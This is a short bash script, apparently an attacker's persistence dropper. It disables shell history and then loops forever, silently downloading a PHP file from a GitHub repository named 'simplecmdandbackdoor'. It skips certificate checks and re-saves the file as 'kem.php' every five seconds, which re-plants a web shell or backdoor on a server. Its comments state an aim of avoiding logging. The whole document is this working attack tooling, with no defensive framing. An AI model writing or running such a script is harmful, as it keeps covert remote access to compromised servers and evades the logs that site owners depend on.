#!/bin/bash
# Disable bash history for this script
HISTFILE=/dev/null
unset HISTFILE

while true; do
  # Suppress wget output and avoid logging
  wget -q --no-check-certificate https://raw.githubusercontent.com/Yucaerin/simplecmdandbackdoor/main/jq.php -O kem.php
  sleep 5
done
